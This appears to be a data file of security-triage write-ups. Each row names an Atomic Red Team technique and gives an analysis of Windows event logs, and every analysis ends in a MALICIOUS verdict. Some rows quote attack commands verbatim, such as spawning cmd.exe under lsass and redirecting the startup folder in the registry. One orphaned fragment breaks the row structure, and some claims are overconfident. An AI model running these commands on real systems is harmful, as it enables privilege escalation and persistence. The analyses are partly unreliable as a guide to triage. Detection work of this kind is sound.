Leverage Virtual Channels to execute custom DLL during successful RDP session,"Upon reviewing the event logs from the Windows host 'Server002', several indicators of potentially malicious activity stand out, warranting a closer examination:

1. **Log Clearing Events**:
   - Multiple logs were cleared, including the System, Security, and Windows PowerShell logs within a very short time frame, which is often indicative of an attempt to cover tracks after unauthorized or malicious activity. This is evident from the Event ID 104 (System and PowerShell logs cleared) and Event ID 1102 (Security log cleared). The activity was conducted by the user 'admin_test', using the process `wevtutil.exe`.

2. **Unusual Registry Modification**:
   - A suspicious command was executed using `cmd.exe` to modify the registry key `HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default\Addins\Malware` with a reference to `amsi.dll`. This is particularly concerning as altering registry keys related to the 'Addins' or using 'amsi.dll' can be associated with attempts to bypass antivirus mechanisms, suggesting a potential malware persistence mechanism.

3. **Sequential Program Activity**:
   - The use of common Windows utilities like `whoami.exe` and `hostname.exe` alongside `wevtutil.exe` processes in a tight sequence suggests someone might have been verifying the user context and system details before and after clearing the logs. This behavior, alongside registry manipulation, often points to malicious reconnaissance and privilege escalation activities.

4. **Integrity Level and Context**:
   - The operations performed by the user `SERVER002\admin_test` executed with 'High' integrity level, typically indicating administrative access and privilege, potentially leading to malicious actions being executed with elevated privileges.

5. **Microsoft Edge Update Logs**:
   - The presence of multiple events related to `MicrosoftEdgeUpdate.exe` and associated setup processes (`MicrosoftEdgeUpdateSetup_X86`) appears regular and part of expected update cycles. However, it should be checked against scheduled tasks or known system update behaviors to ensure no malicious masquerading.

**Assessment**:
The combination of log clearing by `admin_test`, suspicious registry modifications directing to `amsi.dll`, and the coordinated execution of system information retrieval commands (`whoami`, `hostname`) before these actions are taken suggest that these logs reflect a compromise. Particularly, the high frequency of event clearing coupled with registry modifications targeting known paths for attacker persistence aligns with tactics used in known malicious activity.

**Threat/Risk Identified**:
There is a high likelihood that these logs indicate active malicious behavior, possibly involving privilege escalation and cover-up attempts post-action. The registry changes, in particular, suggest attempts to maintain persistence or manipulate system functionalities.

**Guidance**:
- Conduct a full forensic analysis and malware scan of `Server002` to detect any active threats or remnants of malicious software.
- Review user 'admin_test' activities, particularly any elevation of privileges and unauthorized changes.
- Implement measures to prevent unauthorized log clearances, such as tighter audit and alerting mechanisms.
- Consider reverting registry changes, particularly the suspicious modification related to 'amisi.dll'.

**Resolution**:
- MALICIOUS - The logs contain activity indicative of malicious behavior, likely compromise. Further investigation and immediate remediation action are recommended."

   - Modifying startup policies through the registry is a common persistence mechanism leveraged by adversaries.

2. **Event Log Clearing**:
   - Multiple instances of event log clearing are noted in the logs:
      - System logs cleared by `wevtutil.exe`.
      - PowerShell logs cleared.
      - Security logs cleared by a process run with high integrity level.
   - Clearing event logs is a tactic often used by attackers to cover their tracks and avoid detection.

3. **Integrity Level and User Privileges**:
   - The activities were performed with a high integrity level by the user `admin_test`, which suggests elevated privileges were used. 
   - **Privileged Actions**: Notable security privileges were present for the user, including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, `SeLoadDriverPrivilege`, and `SeBackupPrivilege`, which are sensitive and can be exploited for malicious purposes.

4. **Unusual Command Execution Patterns**:
   - Frequent use of `wevtutil.exe` was observed to clear logs, specifically targeting different event log channels systematically.
   - Use of `HOSTNAME.EXE` and `whoami.exe` without specific external triggering events is often seen in reconnaissance phases of a compromise.

5. **Time Stomping**:
   - The time on the machine was altered (`OldTime` and `NewTime` event). While there are legitimate reasons for a time change, it can also be indicative of an attempt to hide timestamps related to malicious activity.

### Assessment:

Based on the analysis, the combination of PowerShell registry modification, event log clearance, and other suspicious process executions strongly indicate malicious activities occurring on the server. The logs show signs of actions that are commonly associated with adversarial tactics aimed at maintaining persistence, conducting reconnaissance, and avoiding detection.

Snake Malware Kernel Driver Comadmin,"### Analysis of Windows Event Logs:

#### PowerShell Logs:
- **Events 1043 to 1049**: Indicate a PowerShell script executed with command-line arguments that manipulate files. The script creates a directory under `C:\Windows\system32\Com`, generates a random byte sequence, and writes it to a file named `comadmin.dat`. This behavior, especially under `system32`, is unusual and can be a sign of malicious activity or evasion attempts, as system directory manipulation is a common technique used by attackers to maintain persistence or hide malicious activities.

#### Application Logs:
- **Events 2384 and 2385**: Show that the Edge Update service has been stopped. While stopping services can be normal, in conjunction with other suspicious events, this might indicate an attempt to disrupt normal operations, especially if used maliciously to prevent updates or security patches.

#### System Logs:
- **Events 3571 and 3572**: Show log files being cleared by the user `admin_test`. Clearing event logs is a tactic often used by attackers to cover their tracks after malicious activity.
  
#### Sysmon Logs:
- **Process `wevtutil.exe` Execution (Events 17953, 17957, 17961, 17965, 17969)**: This process is responsible for clearing event logs, aligning with the system events indicating the logs were cleared. This confirms the use of `wevtutil` to explicitly remove logs, an indicator of potential compromise.
- **Command Line Executions**: The Sysmon logs show a sequence of command-line executions involving PowerShell and EdgeUpdate processes. The PowerShell execution reflects the same suspicious behavior seen in the PowerShell logs.
- **High Privilege Levels**: Many processes run at high integrity levels, verifying a high level of privilege—which, when coupled with log-clearing activities, strengthens the suspicion of malicious intent.

#### Security Logs:
- **Event 30352**: Confirms the clearing of security logs, consistent with techniques used to erase forensic evidence of malicious activities.

### Conclusion:
The collected logs contain several indicators consistent with potential malicious activity:
1. Execution of a PowerShell script that manipulates files within a system directory.
2. Clearing of various event logs shortly after these scripts run, which is a common practice to cover up malicious actions.
3. Use of high integrity levels and administrative privileges during these actions.

### Resolution: **MALICIOUS**
The identified behaviors, such as the manipulation of system directories, log clearing, and the patterns of script execution, align with tactics and techniques used by attackers. Therefore, I'm 100% sure this activity is malicious.

### Guidance on How to Proceed:
1. **Isolate the Affected System**: Immediately isolate `Server002` from the network to prevent any further potential spread or impact.
2. **Conduct a Full Forensic Analysis**: Retrieve a complete forensic image of the system for detailed analysis.
3. **Restore From Backup**: If possible, restore the system from a known-good backup while ensuring that the vulnerability or method used to compromise the system is identified and fixed.
4. **Implement Additional Security Measures**: Enhance monitoring, especially around PowerShell activities, event logging, and privilege use to detect and prevent future incidents. Consider deploying a rule to alert any unexpected execution of `wevtutil` or similar tools.
5. **Review User Activities**: Investigate other actions by `admin_test`, as this account was used for clearing logs and executing potentially malicious scripts. If compromised, reset credentials and audit all associated activities.

Given the observations, it is critical to perform an immediate investigation to understand the full extent and origins of the compromise."
Parent PID Spoofing - Spawn from Current Process,"Upon reviewing the provided Windows event logs, the following observations can be made:

### Suspicious Activity:

1. **PowerShell Execution:**
   - The series of PowerShell logs show the use of a command involving `powershell.exe` with the `Start-ATHProcessUnderSpecificParent` function and the `Start-Sleep 10` command. The execution context suggests some manipulation aimed at disguising or controlling sub-process execution, which is a common tactic used in various attack scenarios to evade detection and gain persistence.

2. **Log Clearing:**
   - The system log indicates that various event logs, including System and Windows PowerShell logs, have been cleared by an account named `admin_test`. Log clearing behavior is often associated with attempts to hide activity, which is suspicious and warrants further investigation.

3. **Wevtutil.exe Process Execution:**
   - In the Sysmon logs, processes for `wevtutil.exe` show a `cl` (clear log) command being executed on multiple channels, including Sysmon, Application, and System logs. The execution of `wevtutil.exe` in this context confirms the manual clearing of logs, likely as an attempt to cover tracks of other activities.

### Malicious Indicators:

1. **High Privilege Activity:**
   - Security logs reveal that privileged operations occurred, with privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and `SeBackupPrivilege` being assigned. Although these operations can be legitimate under certain circumstances, combined with other suspicious activities like log clearing, they can indicate malicious intent.

2. **System User Context:**
   - Various processes are running under the `NT AUTHORITY\SYSTEM` account, which is expected; however, given the context of other suspicious activities, this further supports the potential for malicious actions.

### Resolution:

- **Resolution: MALICIOUS**

Given the combination of suspicious activities, particularly the use of PowerShell for potentially evasive purposes and the clearing of event logs using `wevtutil.exe`, along with the context of high privilege operations, the logs suggest intentional actions to obscure malicious activity. It is essential to conduct a further detailed investigation to identify any malware presence, unauthorized access, or modifications to the system.

### Guidance:

1. **Immediate Actions:**
   - Isolate the affected system (Server002) to prevent further potential compromise.
   - Conduct a thorough forensic analysis to determine the breadth and depth of the compromise.
   - Review user account activities, especially for `admin_test`, across the network for additional indicators of compromise.

2. **Long-term Recommendations:**
   - Enhance monitoring for PowerShell and command executions.
   - Implement strict logging and alerting for event log clearing activities.
   - Educate users on security best practices and consider additional access controls.

This assessment indicates that because of the evidence and patterns observed, the activities recorded in the logs are consistent with malicious behavior."
Access Token Manipulation,"## Detailed Analysis

Upon reviewing the provided logs from the Windows host ""Server002,"" I have identified several notable events indicative of suspicious and potentially malicious activity. Here's a detailed breakdown:

### Indicators of Malicious Activity

1. **PowerShell Execution with Suspicious Command**:
   - The PowerShell logs indicate the execution of a script that changes the execution policy to bypass and attempts to perform actions typically associated with lateral movement or privilege escalation, such as executing a script named `GetToken.ps1`. This script attempts to interact with the `lsass` process, a known technique to harvest credentials.
   - Specific Command: 
     ```
     powershell.exe & {Set-ExecutionPolicy -Scope Process Bypass -Force, ...
     & \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1134.002\\src\\GetToken.ps1\""; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,\""cmd.exe\"")}""
     ```

2. **Clearing of Event Logs**:
   - The system logs indicate that the Windows event logs were cleared at the same time (Security, System, and Windows PowerShell logs). This is a strong indicator of attempted log manipulation to cover tracks, which is a common post-exploitation technique.
   - Logs Cleared by User: `admin_test`

3. **Anomalous Hostname and Whoami Executions**:
   - The frequent execution of legitimate Windows utilities such as `hostname.exe` and `whoami.exe` suggests reconnaissance activity on the host to gather information about the system and current user contexts.

4. **Unexpected Process Creation and Execution**:
   - The process tree shows various `conhost.exe` instances spawned, which aligns with evasive execution tactics leveraging legitimate system processes. However, the activity does not directly indicate illicit usage but contributes to the suspicious nature of the overall activity.

5. **Use of WMI for Process Creation**:
   - The PowerShell script attempts to employ Windows Management Instrumentation (WMI), a powerful interface for managing Windows systems, which further supports the concerns of a potential attack leveraging native Windows tools.

### Assessment and Resolution

Based on the analysis, the activities in the logs provide strong evidence of potentially malicious operations:

- The use of PowerShell to execute a script targeting `lsass` for privilege escalation.
- The synchronized clearing of critical Windows event logs.
- Reconnaissance using typical system utility executions.
- Activities aligned with known adversary techniques, possibly testing or simulating a real-world attack scenario.

Therefore, the resolution for this investigation is: **MALICIOUS**.

HKLM - Modify default System Shell - Winlogon Shell KEY Value,"Upon reviewing the provided logs across multiple channels - PowerShell, Sysmon, Security, Application, and System, I've identified activities that are suspicious and potentially indicative of malicious behavior. Here are the key points of my analysis:

1. **PowerShell Activities:**
   - The logs show execution of a PowerShell script that modifies the Winlogon registry key. It saves a backup of the existing value of the ""Shell"" entry and appends ""C:\Windows\explorer.exe"" to it. Such modifications to the Winlogon registry are indicative of attempts to maintain persistence by modifying the user shell, a known tactic for attackers.

2. **Sysmon Events:**
   - Multiple executions of `wevtutil.exe` with the `cl` (clear logs) command line option were observed. This utility is being used to clear Event Logs (Application, System, Security, Windows PowerShell), which is a suspicious activity often associated with attackers trying to cover their tracks.
   - The `PowerShell.exe` processes executing scripts matching those found in the PowerShell logs are linked to `wevtutil.exe`, which further suggests attempts to execute and hide unauthorized actions.

3. **Security Log:**
   - Clearing of Windows Security logs as indicated by EventID 1102 by the user `admin_test`. The timestamp aligns closely with suspicious activities noted in Sysmon logs regarding the use of `wevtutil.exe` for clearing logs.
   - Privilege escalation activities are noticed where the user `admin_test` is granted a set of extensive privileges (e.g., SeDebugPrivilege, SeBackupPrivilege, etc.), which can be leveraged for malicious intents.

4. **System Log:**
   - The Kernel General log entries suggest possible tampering with system time. Alteration in system time can be used to bypass time-based security controls or to match the time-stamps of malicious actions with normal behavior.

Based on the above points, the findings indicate a potential compromise involving unauthorized persistence mechanisms, log tampering, and privilege escalations, which often characterize a malicious attack. Consequently, my assessment concludes:

**Resolution: MALICIOUS**

**Guidance on how to proceed:**
- Immediate forensic investigation to determine the full extent of the compromise.
- Isolate the affected host (Server002) from the network to prevent further actions by the attacker.
- Review system backups and consider a clean restoration post-investigation.
- Conduct a thorough review of user accounts and suspicious privilege usage.
- Ensure robust logging and monitoring for early detection of similar activities in the future.
- Patch any known vulnerabilities and enforce least privilege principle for user accounts."
Parent PID Spoofing using PowerShell,"### Detailed Analysis of Logs

**Suspicious and Anomalous Behavior:**

1. **Event Logs Clearance (Event ID 1102 and 104):**
   - The security (Event ID 1102) and system (Event ID 104) logs were cleared by the `admin_test` user. Log clearance is often an activity associated with malicious activity as an attacker might try to remove traces of their activities.

2. **PowerShell Activity (Sysmon and Windows PowerShell Logs):**
   - There are multiple instances of PowerShell execution (Sysmon Event ID 1 and Windows PowerShell logs) involving the `PPID-Spoof.ps1` script run by the `admin_test` user from the `AtomicRedTeam` directory. This script is known to be associated with process injection and parent process ID (PPID) spoofing, which can be used to mask malicious activities.

3. **Wevtutil Usage (Sysmon Logs):**
   - The `wevtutil.exe` tool is used to clear the Sysmon/Operational and other log channels. This is executed by the `admin_test` user, aligning with the log clearance events noted above.

4. **Privilege Escalation (Security Log Event ID 4672):**
   - There are privileged logon events for the `SYSTEM` account, which are typical but given the context involving other suspicious actions, they warrant additional scrutiny.

5. **Credential Access Attempts (Security Log Event ID 5379):**
   - Multiple failed credential access operations, with a return code indicating access denied or similar (3221226021), indicate possible attempts to access sensitive information or escalate privileges.

**Signs of Potential Compromise:**

- The combination of cleared logs, PowerShell script execution from a known testing/red team toolkit, and suspicious access attempts indicates that activities beyond normal operations are taking place.
- The use of `wevtutil.exe` and `PPID-Spoof.ps1` suggest attempts at stealthily manipulating or masking process behaviors and logs, typical of more advanced persistent threat actors or during a penetration test.

### Assessment and Resolution:

**Resolution: MALICIOUS**

Given the analytical breakdown, the presence of log clearance activities by a user with administrative privileges, execution of potentially malicious scripts from known offensive security tools, and credential access attempts lead to the conclusion that the logs provide strong indications of compromise. Immediate action is crucial to investigate and mitigate any ongoing or future malicious activities.

### Guidance:

1. **Immediate Steps:**
   - **Containment:** Isolate the affected host (Server002) from the network immediately to prevent further spread or exfiltration of data.
   - **Forensic Analysis:** Perform a detailed forensic analysis of the system disk and memory to identify any malicious artifacts or backdoors.

2. **Remediation:**
   - Conduct a thorough review of user accounts and permissions.
   - Implement stronger logging and monitoring to track any potential misconfigurations or unauthorized access attempts.
   - Patch all identified vulnerabilities and ensure defensive measures like antivirus and firewall are up to date.

3. **Detection and Prevention:**
   - Enhance user training on cybersecurity awareness.
   - Deploy endpoint detection and response (EDR) solutions for real-time monitoring and alerts.
   - Review and update security policies to prevent unauthorized usage of administrative tools.

These actions should help identify the extent of the breach, prevent further malicious activity, and strengthen the network against future attacks."
At.exe Scheduled task,"Analyzing the provided Windows event logs, there are several indicators that stand out as potentially malicious behavior:

### Analysis of Suspicious Activities:

1. **Clearing of Event Logs:**
   - Event ID 1102 and Event ID 104 in the Security and System logs respectively indicate that event logs were cleared by the user `admin_test`. Clearing logs is often a technique used by attackers to cover their tracks, suggesting an attempt to hide malicious activities.

2. **Time Discrepancies:**
   - Event ID 4616 in the Security log shows a time change event. The system time was set backward, which could be intended to disrupt chronological log entries or expiration of security tokens and certificates, enabling certain attacks or evasion techniques.

3. **Use of Wevtutil.exe:**
   - Multiple Sysmon events report the execution of `wevtutil.exe` with the `cl` (clear) command-line option on various system log channels (Security, System, Application, etc.). This confirms the event logs were manually cleared using a command-line utility. This action, coupled with log clearing, strongly implies malicious intent.

4. **Use of Cmd.exe and At.exe:**
   - Process execution of `cmd.exe` and `at.exe` is noted with high integrity levels by the user `admin_test`. The command `""cmd.exe"" /c at 13:20 /interactive cmd` suggests the scheduling of a task using the `at` command for potentially unauthorized or malicious activities under an interactive session, which points towards privilege escalation attempts or persistence mechanisms.

5. **Miscellaneous Tool Usage:**
   - Standard system tools like `whoami.exe`, `hostname.exe`, and `conhost.exe` are used, typically innocuous, but in conjunction with the above activities, they might have been employed in reconnaissance efforts during a compromise.

### Conclusion:
The logs exhibit behavior consistent with an attempt to compromise the system:

- Clearing of logs to cover tracks.
- Potential alteration of system time for dubious purposes.
- Usage of system utilities in a potentially malicious manner.
- Evidence of privilege escalation tactics using scheduled tasks with `cmd.exe` and `at.exe`.

Given these observations, the activities in these logs are deemed **MALICIOUS**. 

### Recommendation:
1. **Immediate Response**:
   - Isolate the affected host to prevent further access or lateral movement within the network.
   - Conduct a detailed forensic investigation to understand the full scope of the breach.
   - Review and re-secure user accounts, especially those with administrative privileges.
   - Examine network traffic for any data exfiltration or communications with known malicious IPs.
   
2. **Security Measures**:
   - Implement enhanced logging and monitoring for early detection of log tampering and unusual command executions.
   - Enable Sysmon with comprehensive logging and ensure all logs are sent to a secure, tamper-evident centralized logging solution.
   - Review and potentially disable unnecessary services like the `at` command scheduler to prevent misuse.

3. **Recovery**:
   - After thorough investigation and mitigation, rebuild the affected systems to ensure no backdoors or malicious remnants remain."
Domain Password Policy Check: No Lowercase Character in Password,"Upon analyzing the provided Windows event logs, there are several observations indicative of potentially suspicious or malicious activities. Below is a detailed analysis:

1. **Unusual PowerShell Activity**:
   - The `Windows PowerShell log` entries and `Sysmon log` entries show that a PowerShell script was executed in user's session (`SERVER002\\admin_test`). This activity attempts to change the password of the user account using a hardcoded password.
   - The script and its purpose of changing the password programmatically without user input is a common tactic in malicious activities and could indicate an attempt to secure persistence or escalate privileges quietly.

2. **Clearing of Event Logs**:
   - In both the `Security log` and `System log`, there are entries showing that logs were cleared by `admin_test`. This action is typically associated with attackers trying to cover their tracks by removing evidence of their activities.

3. **Sysmon Events Involving `wevtutil`**:
   - There were several entries involving the execution of `wevtutil.exe` to clear logs. This tool is used for managing Windows event logs and its use in conjunction with log clearing events further supports suspicious activity.

4. **System Level Process Execution**:
   - System-level processes such as `setup.exe` from `Microsoft Edge` are seen running multiple times with different command line arguments. While these are legitimate processes, their timing, along with concurrent suspicious activity, warrants a closer examination to rule out misuse or disguised malicious payloads/updates.
   
5. **No Benign Reason for Actions**:
   - While Microsoft Edge update processes can execute under the `NT AUTHORITY\\SYSTEM`, the correlation of log-clearing events, PowerShell password changes, and obscured command-lines in the same timeframe hints heavily toward coordinated malicious activity.

**Conclusion**:

The provided logs contain strong indicators of malicious activity:
- Unauthorized use of PowerShell scripting to manipulate user credentials.
- Systematic clearing of event logs to erase traces of action.
- Potential misuse of legitimate processes to maintain persistence.

**Resolution**: **MALICIOUS**

**Guidance**:
- Immediate isolation of the affected system (""Server002"") should be performed to prevent further potential breaches.
- Comprehensive forensic analysis should be conducted to understand the full scope of the compromise.
- Review and reset passwords for user accounts, particularly `admin_test` on the affected and any potentially connected systems.
- Strengthen monitoring and alert mechanisms for such activities in the future, ensuring administrative activities are logged and reviewed promptly."
Juicy Potato,"**Analysis of Windows Event Logs:**

Upon reviewing the provided event logs, several activities indicative of potentially malicious behavior are present. These observations are detailed below:

1. **Event Log Clearing:**
   - The logs show multiple entries with Event ID 104 and 1102, indicating the clearing of Windows event logs (`System`, `Windows PowerShell`, and `Security`). The user `admin_test` is seen initiating these actions.
   - Clearing of logs is a suspicious action often associated with attempts to cover tracks following unauthorized activities.

2. **Suspicious PowerShell Activity:**
   - A log entry showing the execution of a PowerShell command involved running `JuicyPotato.exe`, a well-known privilege escalation exploit. This is executed by `admin_test` from `PowerShell`, as seen in the `Sysmon` and `Windows PowerShell` logs.
   - The command involves specifying a specific CLSID, logged with highly unusual command-line arguments, which are characteristic indicators of an intent to escalate privileges illicitly.

3. **Miscellaneous Command Executions:**
   - Processes such as `whoami.exe`, `HOSTNAME.EXE`, and others have been executed in a sequence that often indicates system reconnaissance activities. These actions can be benign but are suspicious in the context of other unusual activities present in the logs.

4. **Process and Integrity Levels:**
   - The suspicious entries for `wevtutil.exe` (log clear operations) and `JuicyPotato.exe` and their parent/child processes run with high integrity levels, suggesting an attempt to perform elevated actions on the system.

5. **Lack of Additional Security Product Logging:**
   - Logs do not illustrate the operation of any third-party security solutions during the potentially malicious activity timeframe, apart from indications that Windows Defender was running.

Based on these findings, it is strongly suggested that the activities occurring are highly suspicious, entail potential system reconnaissance, privilege escalation attempts, and evasion techniques through log clearing.

**Resolution: MALICIOUS**

Given the indicators:
- Use of `JuicyPotato.exe` for potential privilege escalation.
- Clearing of significant system logs following actions seemingly designed to elevate privilege level.
- Execution of system enumeration commands, potentially without legitimate administrative oversight.

**Recommendations for Next Steps:**
1. **Network Segmentation:** Isolate the compromised host to prevent potential lateral movement and further network infiltration.
2. **Incident Response Engagement:** Engage with an incident response team to investigate the full scope and extent of the breach.
3. **Review Access Logs:** Examine user activities and network logs to identify additional unauthorized access points or involved entities.
4. **Increase Monitoring:** Implement enhanced monitoring postures with alerts for similar suspicious behaviors.
5. **Security Patching & Harden Policies:** Ensure system patches and security configurations are applied and routinely updated, focusing on privilege escalation vulnerabilities.

Immediate action is crucial given the potential compromise evidenced by these activities."
Change Startup Folder - HKLM Modify User Shell Folders Common Startup Value,"Based on the analysis of the provided logs from the Windows host, several indicators suggest potentially malicious activity occurring within the system. Let's break down the main points of concern:

1. **PowerShell Activity:**
   - The PowerShell command, `powershell.exe & {New-Item -ItemType Directory -path \""$env:TMP\\atomictest\\\""; Copy-Item -path \""C:\\Windows\\System32\\calc.exe\"" -destination \""$env:TMP\\atomictest\\\""; Set-ItemProperty -Path \""HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\"" -Name \""Common Startup\"" -Value \""$env:TMP\\atomictest\\\""}`, is performing a sequence of operations:
     - Creating a directory in the temporary environment.
     - Copying the calculator executable (`calc.exe`) to this newly created directory.
     - Modifying the registry to use this directory as a ""Common Startup"" folder.
   - These steps align with tactics used for persistence and potentially malicious activity, as the copied executable could potentially be utilized for further execution upon system restart.

2. **Log Clearing and Command Line Utility Use:**
   - There is a suspicious usage of `wevtutil.exe cl` to clear event logs, including the Sysmon, Application, System, and Security logs, as indicated by multiple events. This action is often associated with attempts to cover tracks and conceal other potentially malicious activities.
   - The presence of a user `admin_test` performing these actions further heightens suspicion, as log clearing generally requires administrative privileges.

3. **Security and System Events:**
   - Event ID `1102` and multiple `EventID 104` entries indicate the clearing of logs, which is atypical for normal system operations and suggests an attempt to remove evidence of other actions.

4. **Sysmon Logs:**
   - These logs show consistent invocation of system utilities and Edge Update processes, showing a normal pattern for updates.
   - However, the clearance operations and the overlapping time frames with the PowerShell operations provide a context that increases the likelihood of these activities being related to malicious operations.

**Assessment:**

- The compilation of logs hints at an attempt to establish persistence through startup modification, potentially hide activities through log clearing, and an unauthorized replication and potential future execution of a Windows system executable (`calc.exe`).
  
**Resolution: MALICIOUS**

**Guidance on Proceedings:**

- **Immediate Response:**
   - Isolate the impacted host to prevent further potential spread or escalation of any ongoing malicious activity.
   - Review other logs that might still have records of unexplained or unauthorized administrative activities.

- **Further Investigation:**
   - Conduct a thorough system forensic analysis to identify other potential traces of this compromise. Ensure to capture memory images and disk data as part of this process.
   - Analyze network logs to review any suspicious outbound connections during the reported windows of activity.

- **Remediation:**
   - Change credentials for any administrative accounts that have been compromised or suspected of being compromised.
   - Rebuild the system from a known good state and apply necessary security updates and changes.

- **Prevention:**
   - Implement more stringent monitoring on PowerShell usage.
   - Use logging solutions that can detect and alert on log clearing and monitor changes in startup items and critical directories.
   - Educate users and administrators on recognizing and reporting unusual system behavior."
Suspicious vbs file run from startup Folder,"### Analysis of the Windows Event Logs:

1. **PowerShell Logs**:
   - There are multiple instances where PowerShell was used to execute scripts using `powershell.exe`. It is notable that files from the `AtomicRedTeam` folder were copied to the Startup folder, and the `vbsstartup.vbs` script was executed using `cscript.exe`. This kind of behavior is often associated with persistence mechanisms used by adversaries to maintain their access to a machine after a reboot.

2. **Sysmon Logs**:
   - There are several `Process Create` events associated with the execution of `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cscript.exe`. The process `wevtutil.exe` was frequently used to clear logs (especially the Sysmon/Operational, Application, and Security logs). Log evasion is a common tactic used by attackers to cover their tracks.
   - The execution of `cscript.exe` with a VBS file from the Startup directory suggests a silent execution of possibly persistent scripts upon system startup.

3. **Security Logs**:
   - Event ID `1102` indicates that the security log was cleared by the user `admin_test`. The clearing of logs by a user, especially one associated with privilege levels such as `admin_test`, raises suspicion as it may indicate an attempt to hide malicious activity.

4. **System Logs**:
   - Event ID `104` shows that logs were cleared for both the System and Windows PowerShell channels by `admin_test`. The frequent clearing of logs in a short time frame is highly suspicious and uncommon for regular administrative tasks.

### Assessment:
The logs collectively indicate several red flags associated with potentially malicious activity:
- **Persistence Techniques**: Copying and executing scripts from the Startup folder using PowerShell.
- **Evasion Techniques**: Frequent use of `wevtutil.exe` to clear logs, indicative of an attempt to erase evidence.
- **Suspicious User Behavior**: The `admin_test` user clearing multiple logs around the same time the scripts are executed.

### Resolution:
- **Resolution**: MALICIOUS

### Guidance on How to Proceed:
1. **Immediate Action**: 
   - Isolate the affected host (`Server002`) from the network to prevent further malicious activity or spread to other systems.
   - Preserve the current state of the host for forensic analysis, ensuring no further tampering can occur.

2. **Investigation and Remediation**:
   - Conduct a thorough forensic investigation on `Server002` to understand the scope and impact of the intrusion.
   - Analyze persistence mechanisms by inspecting the Startup folder and reviewing any additional unauthorized scripts or scheduled tasks.
   - Reset credentials for the `admin_test` account and review all privileged account activities for compromise.

3. **Security Enhancement**:
   - Review and update security policies for log retention and audit trails to ensure early detection and proper incident response.
   - Educate users on phishing, social engineering tactics, and the significance of reporting suspicious activities.

4. **Monitoring & Future Prevention**:
   - Implement enhanced monitoring for PowerShell and cmd execution, especially involving suspicious directory paths or systems exhibiting similar behaviors.
   - Deploy endpoint detection and response (EDR) solutions to monitor and detect anomalous activities and potential threats in real-time."
PowerShell Modify A Scheduled Task,"### Detailed Analysis of Logs

#### PowerShell Logs
- **Scheduled Task Manipulation:** The PowerShell logs indicate the creation and modification of a scheduled task using the `New-ScheduledTaskAction` and `Set-ScheduledTask` cmdlets. The task, named ""AtomicTaskModifed,"" initially triggers `cmd.exe` and is then modified to execute `Notepad.exe`. The execution is set to RunLevel Highest within the Administrators group, indicating privileged execution. Scheduled task modification is a common persistence mechanism used by attackers to maintain access to a compromised system.

#### Sysmon Logs
- **Execution of Event Utilities:** Multiple executions of `wevtutil.exe` are observed, which is typically used for managing or clearing event logs. The specific command lines indicate clearing specific logs such as System, Application, and Security logs. This activity, particularly log clearing, is a known tactic to hide tracks after malicious activities.
  
- **PowerShell Activity:** The execution of PowerShell with a high integrity level aligns with the previous PowerShell log entries that suggest task manipulation. The execution happened in a temporary directory by the user ""admin_test,"" which might indicate an execution of a script with administrative privileges, possibly part of the task manipulation or further configuration/scripts set up by the user.

#### System Logs
- **Event 104 Entries (Log File Cleared):** The occurrence of System and Windows PowerShell log clearance further confirms attempts to clean up logs, suppressing evidence of potential malicious actions.

#### Security Logs
- **Event 1102 (Security Log Cleared):** The clearance of the security log indicates an attempt to remove traces of logon sessions or tampering with security-relevant events, often employed by attackers post-compromise.
- **Privilege Elevation:** Several instances of the privilege 'SeDebugPrivilege' and other high-impact privileges suggest that the user ""admin_test"" had elevated their privileges, which could be indicative of an attempt to bypass user assurance and inject or modify configurations.
- **Time Manipulation Events (Event 4616):** There are log entries indicating time alterations. This could be a mechanism to confuse timestamp-based log correlation or reflect attempts to circumvent time-based defenses.

### Assessment

The combination of scheduled task manipulation, event log clearing, elevation of privileges, and use of high-integrity operations closely aligns with tactics, techniques, and procedures (TTPs) used by attackers to persist and evade detection within a Windows environment.

### Threats & Risks Identified
- Persistence through scheduled task manipulation.
- Evasion by clearing event logs for system, security, and application.
- Privilege escalation evidenced by elevated privileges typically associated with administrative access.

### Guidance on How to Proceed
1. **Immediate Containment:** Isolate the host (Server002) to prevent any potential propagation of threats.
2. **Review Scheduled Tasks:** Examine and delete suspicious scheduled tasks, especially ""AtomicTaskModifed.""
3. **Audit User Activity:** Investigate the ""admin_test"" account activity and consider a password reset or disablement until clearances are verified.
4. **Recover Event Logs:** Attempt to recover cleared logs from backup if available, to obtain a complete review of historical actions.
5. **Full Malware Sweep:** Conduct a thorough antivirus/anti-malware scan tailored with threat intelligence on the system.
6. **Implement Monitoring:** Enhanced logging and monitoring of scheduled task changes and privilege elevation should be enforced.

### Resolution
Based on the detailed analysis, the observed activities within the logs are a clear indication of compromise tactics, suggesting a data breach or malicious activity.

**Final Resolution:** Malicious."
Suspicious jse file run from startup Folder,"After analyzing the provided Windows event logs, several indicators of potentially malicious activity were identified:

1. **Event Log Clearing (Security, Sysmon, System, and PowerShell Channels Cleared)**:
   - There are multiple events (Event ID 1102 on the Security log and Event ID 104 on the System log) indicating that various Windows event logs were cleared around the same time. Specifically, logs associated with the security, system, and PowerShell channels were cleared. Log clearing is a common tactic used by attackers to hide their tracks after compromising a system.

2. **Suspicious PowerShell Activity**:
   - Multiple PowerShell logs indicate that a script was executed to copy a JScript file (`jsestartup.jse`) to startup folders and then execute it via `cscript.exe`. This behavior is typically associated with persistence mechanisms seen in malware campaigns.

3. **Indicators of a Red Team Tool**:
   - The PowerShell command references `AtomicRedTeam`, which is a known simulation of adversarial techniques for security testing. Although it's used for testing, its presence on a production server without prior awareness can indicate an unauthorized security test or potential misuse by a malicious actor.

4. **Sysmon Logs and Process Execution**:
   - Multiple Sysmon logs capture processes being spawned and executed around the same timestamp of the log clearing and PowerShell activities. Notable ones include the execution of `cscript.exe` with the startup JSE script, suggesting that this was executed with an intention for persistence.

5. **Time Discrepancies and Adjustments**:
   - Several logs show time adjustments and time zone information being changed by `svchost.exe`. Malicious actors sometimes modify system times to avoid timestamp-based detection or alerting mechanisms. While this can sometimes be benign and related to system sync issues, it's suspicious in the context of other events.

Based on these findings, the activities recorded in these logs are not typical for regular operations and reflect behaviors commonly seen in malicious activity scenarios.

**Resolution**: MALICIOUS

**Guidance**:
- Conduct a thorough forensic investigation to understand the extent and impact of the compromise.
